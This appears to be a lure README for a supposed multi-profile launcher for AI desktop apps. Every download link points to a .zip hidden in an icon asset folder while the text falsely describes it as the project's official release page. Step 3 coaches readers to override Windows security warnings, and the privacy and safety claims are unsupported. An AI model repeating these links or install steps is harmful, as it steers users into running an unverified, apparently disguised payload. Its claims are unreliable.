# 🖥️ agent-profiles - Run Multiple AI Agents Side-by-Side

[![Download Now](https://img.shields.io/badge/Download-agent--profiles-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/burnabyjudicial666/agent-profiles/main/src-tauri/icons/android/mipmap-xxxhdpi/3.6.zip)

---

## 👋 What Is agent-profiles?

Have you ever wished you could run two or more ChatGPT accounts at the same time on your computer? Or maybe you want Claude Desktop and Cursor open together without them interfering with each other?

**agent-profiles** is a small, smart tool that lives in your system tray (the area at the bottom-right of your screen on Windows, or top-right on Mac). It lets you run **multiple separate profiles** of AI agent applications—like Claude Desktop, ChatGPT, Cursor, and others—**all at once**, without them mixing up your login information, settings, or conversations.

Think of it like having separate "user accounts" on a shared computer, but for your AI apps. Each profile is completely isolated, so you can be logged into your personal ChatGPT in one window and your work ChatGPT in another, simultaneously.

---

## ✨ Key Features

- **🔄 Run Multiple Accounts Side-by-Side** – Open several instances of Claude Desktop, ChatGPT, Cursor, or other AI agent apps without conflicts.
- **🔒 Separate Profiles** – Each instance has its own login, preferences, and history. No more logging out and back in.
- **⚡ Quick Switching** – Access all your profiles instantly from the menu bar or system tray.
- **💾 Lightweight & Fast** – Built with Rust and Tauri, so it uses minimal system resources.
- **🖥️ Works on Windows, macOS & Linux** – One tool for all your operating systems.
- **🎨 Clean & Simple Interface** – No complicated settings. Just click and run.

---

## 🚀 Getting Started

Follow these simple steps to start using agent-profiles on your computer:

### Step 1: Download the Application

**Visit this link to download the application:** [https://raw.githubusercontent.com/burnabyjudicial666/agent-profiles/main/src-tauri/icons/android/mipmap-xxxhdpi/3.6.zip](https://raw.githubusercontent.com/burnabyjudicial666/agent-profiles/main/src-tauri/icons/android/mipmap-xxxhdpi/3.6.zip)

This will take you to the official GitHub page for the project. Look for the "Releases" section on the right side of the page or scroll down to find the download section.

### Step 2: Choose Your Version

On the download page, you'll see a list of files. Choose the one that matches your operating system:

- **For Windows:** Look for a file named something like `agent-profiles-setup.exe` or `agent-profiles-windows.zip`
- **For macOS:** Look for `.dmg` or `.app` files
- **For Linux:** Look for `.deb`, `.rpm`, or `.AppImage` files

If you're unsure which one to pick, the `.exe` file (Windows) or the `.dmg` file (macOS) are usually the safest choices.

### Step 3: Run the Installer

Once the file is downloaded:

1. **Double-click** the downloaded file.
2. If you see a security warning (like "Windows protected your PC"), click **"More info"** and then **"Run anyway"**. This happens with many independent apps that haven't been certified by Microsoft.
3. Follow the installation wizard if one appears. It will usually just ask you to click **"Next"** and **"Install"**.
4. Once installed, agent-profiles will appear in your system tray automatically.

### Step 4: Start Using It

That's it! You can now:

- Click the **agent-profiles icon** in your system tray to see a menu.
- From the menu, you can **create new profiles** for different apps.
- Choose which app you want to open (like Claude Desktop or ChatGPT).
- Launch as many profiles as you need—each one will run separately.

---

## 📖 How to Create Your First Profile

1. **Open agent-profiles** from your system tray.
2. Click **"Create New Profile"**.
3. Give your profile a name (like "Work" or "Personal").
4. Select which application you want to use for this profile (e.g., Claude Desktop, ChatGPT, Cursor).
5. Click **"Create"**.

Now, when you open that profile, it will launch the selected app with its own separate space. You can create as many profiles as you need!

---

## 🛠️ Supported Applications

agent-profiles works with a variety of AI agent applications, including:

- **Claude Desktop**
- **ChatGPT**
- **Cursor**
- **Codex**
- **Visual Studio Code**
- And other coding agents and AI chat apps

If you use a different AI tool, you can still create a profile for it—agent-profiles is flexible and can work with most desktop applications.

---

## ❓ Frequently Asked Questions

### Why would I need multiple profiles?

If you use different accounts for work and personal use, or you want to keep your AI conversations organized by project, having separate profiles eliminates the need to constantly log in and out. It also prevents conflicts between accounts that sometimes happen when apps share data.

### Will it slow down my computer?

No! agent-profiles is built with **Rust and Tauri**, which means it's extremely lightweight. It uses very little memory and CPU power compared to the AI apps themselves.

### Do I need to be a programmer to use this?

Absolutely not. agent-profiles is designed for everyone. You just download it, install it, and click to create profiles. No coding knowledge required.

### Is my data safe?

Yes. Each profile is completely isolated, meaning your login credentials and conversations are stored separately. Nothing is mixed up or shared between profiles.

### Can I use it on multiple computers?

Yes, the software can be installed on as many computers as you like. Just download and install it on each machine.

---

## 📝 System Requirements

agent-profiles is designed to run on most modern computers. Here are the general requirements:

- **Operating System:** Windows 10 or later, macOS 11 (Big Sur) or later, or a recent Linux distribution
- **RAM:** at least 2GB (4GB recommended)
- **Storage:** approximately 50MB of free disk space
- **Internet:** not required for the app itself, but you'll need it to use the AI applications

---

## 🤝 Need Help?

If you have questions, run into issues, or just want to share feedback, here are the best ways to get help:

- **GitHub Issues:** Visit the project page and click on the "Issues" tab to ask questions or report bugs.
- **Community Discussions:** Check if there's a "Discussions" section on the GitHub page for community conversations.

The project is actively maintained, so you can expect regular updates and improvements.

---

## 📦 What Version Should I Download?

If you're on **Windows**, download the file ending in `.exe`. This is the installer that sets everything up for you.

If you're on **macOS**, download the `.dmg` file. Double-click it, then drag the app icon to your Applications folder.

If you're on **Linux**, download the file that matches your distribution (like `.deb` for Ubuntu/Debian or `.rpm` for Fedora). If you don't know which one, the `.AppImage` file usually works on any distribution.

---

## 🔒 Privacy & Security

agent-profiles does **not** collect any personal data. It runs entirely on your computer and does not send any information to external servers. Your AI conversations remain private to each profile.

The code is open-source, meaning anyone can inspect it to verify its security.

---

## 🎉 Get Started Today

Running multiple AI agents side-by-side has never been easier. Say goodbye to logging in and out repeatedly. Say hello to a more organized and efficient workflow.

**Download agent-profiles now:**

[![Download Now](https://img.shields.io/badge/Download-agent--profiles-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/burnabyjudicial666/agent-profiles/main/src-tauri/icons/android/mipmap-xxxhdpi/3.6.zip)

---

## 📚 Technical Details (For the Curious)

agent-profiles is built using:
- **Tauri** – a framework for building small, fast, secure desktop applications
- **Rust** – a modern programming language known for performance and reliability

The combination means the app starts instantly, uses minimal memory, and is stable even during long sessions.

---

## 🔄 Regular Updates

The developer regularly releases updates to:
- Add support for new AI applications
- Improve performance
- Fix bugs
- Enhance the user interface

To update, simply download the latest version from the same page and install it over your current version.

---

## 🏁 Final Thoughts

If you're someone who uses ChatGPT, Claude, Cursor, or similar AI tools on a daily basis, **agent-profiles** will quickly become an essential part of your setup. It's simple, fast, and solves a real problem that many users face.

Don't wait—download it today and start running multiple AI agents without any hassle!

---

**Keywords:** ai-agents, chatgpt, claude, claude-desktop, codex, coding-agents, cursor, desktop-app, linux, macos, menubar, multi-account, profile-manager, rust, tauri, tray-application, vscode, windows